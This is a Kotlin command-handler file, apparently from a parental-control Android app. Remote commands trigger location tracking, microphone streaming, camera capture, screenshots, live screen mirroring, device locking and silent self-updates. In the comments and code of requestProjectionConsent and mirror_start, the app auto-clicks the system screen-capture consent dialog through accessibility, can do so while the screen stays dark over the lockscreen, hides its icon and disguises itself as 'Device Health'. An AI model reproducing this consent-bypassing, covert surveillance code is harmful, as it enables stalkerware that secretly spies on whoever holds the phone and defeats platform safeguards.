package com.familyguard.child.util

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.app.admin.DevicePolicyManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.familyguard.child.IconHider
import com.familyguard.child.admin.AdminReceiver
import com.familyguard.child.data.Api
import com.familyguard.child.data.ChildApp
import com.familyguard.child.data.Store
import com.familyguard.child.service.Locator
import com.familyguard.child.service.AudioStreamer
import com.familyguard.child.service.MirrorManager
import com.familyguard.child.service.WsChild
import com.familyguard.child.ui.BlockOverlay
import com.familyguard.child.ui.ConsentActivity
import com.familyguard.child.util.SelfHeal
import com.google.gson.JsonArray
import com.google.gson.JsonObject

object CommandHandler {

    suspend fun execute(ctx: Context, cmd: JsonObject): Pair<Boolean, JsonObject> = try {
        val action = cmd.get("action")?.takeIf { it.isJsonPrimitive }?.asString ?: ""
        val params = cmd.get("params")?.takeIf { it.isJsonObject }?.asJsonObject ?: JsonObject()
        handle(ctx, action, params)
    } catch (e: Exception) {
        val d = JsonObject()
        d.addProperty("error", e.message ?: "failed")
        Pair(false, d)
    }

    private suspend fun handle(ctx: Context, action: String, params: JsonObject): Pair<Boolean, JsonObject> {
        val data = JsonObject()
        return when (action) {

            "locate_now" -> {
                val f = Locator.getCurrent(ctx)
                if (f != null) {
                    runCatching { Api.postLocation(f.lat, f.lng, f.accuracy, f.speed, f.battery) }
                    data.addProperty("lat", f.lat)
                    data.addProperty("lng", f.lng)
                    Pair(true, data)
                } else {
                    data.addProperty("error", "no fix")
                    Pair(false, data)
                }
            }

            "ring" -> {
                RingPlayer.start(ctx)
                data.addProperty("status", "ringing")
                Pair(true, data)
            }

            "ring_stop" -> {
                // Same button toggle: parent ne "Ring band karo" tap kiya
                RingPlayer.stop()
                Pair(true, data)
            }

            "audio_start" -> {
                val (ok, d) = AudioStreamer.start(ctx)
                data.add("audio", d)
                Pair(ok, data)
            }

            "audio_stop" -> {
                AudioStreamer.stop()
                Pair(true, data)
            }

            "lock" -> {
                val msg = params.get("message")?.takeIf { it.isJsonPrimitive }?.asString ?: "Locked by parent"
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val locked = runCatching {
                    if (dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))) {
                        dpm.lockNow()
                        true
                    } else {
                        false
                    }
                }.getOrDefault(false)
                if (!locked) {
                    BlockOverlay.show(ctx, BlockOverlay.Reason.LOCKED, "Device locked", msg)
                }
                Pair(true, data)
            }

            "unlock" -> {
                BlockOverlay.hide(BlockOverlay.Reason.LOCKED)
                Pair(true, data)
            }

            "screenshot" -> {
                val f = MirrorManager.captureOnce(ctx)
                if (f != null) {
                    val url = Api.uploadMedia(f)
                    data.addProperty("url", url)
                    runCatching { f.delete() }
                    Pair(true, data)
                } else {
                    // No capture permission (e.g. after reboot) — pop the consent dialog
                    // (auto-confirmed by accessibility); next attempt will succeed.
                    requestProjectionConsent(ctx)
                    data.addProperty("error", "no permission — consent auto-requested, retry shortly")
                    Pair(false, data)
                }
            }

            "camera" -> {
                val front = params.get("facing")?.takeIf { it.isJsonPrimitive }?.asString == "front"
                val f = CameraCapture.take(ctx, front)
                if (f != null) {
                    val url = Api.uploadMedia(f)
                    data.addProperty("url", url)
                    runCatching { f.delete() }
                    Pair(true, data)
                } else {
                    data.addProperty("error", "camera unavailable")
                    Pair(false, data)
                }
            }

            "mirror_start" -> {
                val fps = params.get("fps")?.takeIf { it.isJsonPrimitive }?.asInt ?: 8
                val quality = params.get("quality")?.takeIf { it.isJsonPrimitive }?.asInt ?: 60
                if (MirrorManager.startStreaming(fps, quality)) {
                    sendMirrorState(true)
                    data.addProperty("status", "streaming")
                    Pair(true, data)
                } else {
                    // Capture permission missing (e.g. after reboot): pop the consent
                    // dialog (accessibility auto-confirms it) and remember the request so
                    // MirrorService resumes streaming the moment consent is granted.
                    Store.pendingMirrorFps = fps
                    Store.pendingMirrorQuality = quality
                    val launched = requestProjectionConsent(ctx)
                    sendMirrorState(false)
                    data.addProperty("status", "consent_pending")
                    data.addProperty(
                        "note",
                        if (launched) "permission requested — auto-confirming, mirror starts in a few seconds"
                        else "waiting for consent dialog (already open / recently requested)"
                    )
                    Pair(true, data)
                }
            }

            "mirror_stop" -> {
                // Stop frames only — the projection session STAYS warm (one-time
                // consent design). Ending the session would force a fresh consent
                // dialog on the next Start; keeping it means the parent's next tap
                // streams within ~1 s with NO popup.
                MirrorManager.stopStreaming()
                Store.pendingMirrorFps = -1
                sendMirrorState(false)
                Pair(true, data)
            }

            "mirror_request_permission" -> {
                requestProjectionConsent(ctx)
                Pair(true, data)
            }

            "show_app_icon" -> {
                IconHider.show(ctx)
                Pair(true, data)
            }

            "hide_app_icon" -> {
                IconHider.hide(ctx)
                Pair(true, data)
            }

            "get_apps" -> {
                val pm = ctx.packageManager
                val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
                val apps = pm.queryIntentActivities(intent, 0)
                    .map { ChildApp(it.activityInfo.packageName, it.loadLabel(pm).toString()) }
                    .distinctBy { it.pkg }
                val arr = JsonArray()
                apps.forEach { a ->
                    val o = JsonObject()
                    o.addProperty("pkg", a.pkg)
                    o.addProperty("name", a.name)
                    arr.add(o)
                }
                val m = JsonObject()
                m.addProperty("type", "apps")
                m.add("apps", arr)
                WsChild.send(m.toString())
                Pair(true, data)
            }

            "message" -> {
                val title = params.get("title")?.takeIf { it.isJsonPrimitive }?.asString ?: "Message"
                val text = params.get("text")?.takeIf { it.isJsonPrimitive }?.asString ?: ""
                BlockOverlay.show(ctx, BlockOverlay.Reason.MESSAGE, title, text)
                runCatching {
                    ensureChannel(ctx)
                    val n = NotificationCompat.Builder(ctx, CH_FG)
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setContentTitle(title)
                        .setContentText(text)
                        .setAutoCancel(true)
                        .build()
                    if (
                        ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
                        Build.VERSION.SDK_INT < 33
                    ) {
                        NotificationManagerCompat.from(ctx).notify(9005, n)
                    }
                }
                Handler(Looper.getMainLooper()).postDelayed(
                    { BlockOverlay.hide(BlockOverlay.Reason.MESSAGE) },
                    8000
                )
                Pair(true, data)
            }

            "release_protections" -> {
                AgeRelease.releaseAll(ctx)
                Pair(true, data)
            }

            "heal" -> {
                SelfHeal.runNow(ctx)
                data.add("health", SelfHeal.healthReport(ctx))
                Pair(true, data)
            }

            "update_apk" -> {
                // Parent ne "Child app update" button dabaya — silent self-update
                // abhi check karo (server par naya APK ho to khud install ho jayega).
                val status = com.familyguard.child.util.UpdateManager.checkAndInstall(ctx)
                data.addProperty("status", status)
                Pair(true, data)
            }

            "health" -> {
                data.add("health", SelfHeal.healthReport(ctx))
                Pair(true, data)
            }

            else -> {
                data.addProperty("error", "unknown action")
                Pair(false, data)
            }
        }
    }

    // Neutral brand — bachche ke phone par kahi bhi "FamilyGuard"/parental-control
    // na dikhe. Notification text ab "Device Health" theme me hai.
    const val CH_FG = "dh_service"

    private fun ensureChannel(ctx: Context) {
        runCatching {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.deleteNotificationChannel("fg_service") // purana branded channel hatao
            nm.createNotificationChannel(
                NotificationChannel(CH_FG, "Device Health", NotificationManager.IMPORTANCE_MIN)
            )
        }
    }

    /** Tell the parents the real mirroring state so their UI never shows a fake
     *  "LIVE" while the child is still waiting for the consent dialog. */
    private fun sendMirrorState(streaming: Boolean) {
        runCatching {
            val m = JsonObject()
            m.addProperty("type", "mirror_state")
            m.addProperty("streaming", streaming)
            WsChild.send(m.toString())
        }
    }

    /** Launch the system screen-capture consent dialog without user interaction.
     *  Works from background because the app holds the overlay permission; if the
     *  OEM blocks that, fall back to a tap-able heads-up notification. EnforcementService
     *  auto-clicks "Start now" within 60 s of this call.
     *  quiet=true (reboot path): do NOT wake the screen — the dialog is handled
     *  over the lockscreen while the phone stays dark.
     *  Returns true when a fresh dialog request was launched. A re-launch within
     *  8 s of the previous one is suppressed: stacked dialogs were the reason the
     *  screen-recording prompt appeared "bar bar" and then blocked the screen. */
    fun requestProjectionConsent(ctx: Context, quiet: Boolean = false): Boolean {
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - Store.lastConsentRequestAt < 8_000L) return false
        Store.lastConsentRequestAt = now
        Store.projectionRequestedAt = now
        try {
            ctx.startActivity(
                Intent(ctx, ConsentActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .putExtra("quiet", quiet)
            )
        } catch (_: Exception) {
            val pi = PendingIntent.getActivity(
                ctx, 9003,
                Intent(ctx, ConsentActivity::class.java).putExtra("quiet", quiet),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            ensureChannel(ctx)
            val n = NotificationCompat.Builder(ctx, CH_FG)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Screen sharing")
                .setContentText("Tap to allow screen sharing")
                .setContentIntent(pi)
                .setAutoCancel(true)
                .build()
            if (
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
                Build.VERSION.SDK_INT < 33
            ) {
                NotificationManagerCompat.from(ctx).notify(9004, n)
            }
        }
        return true
    }
}
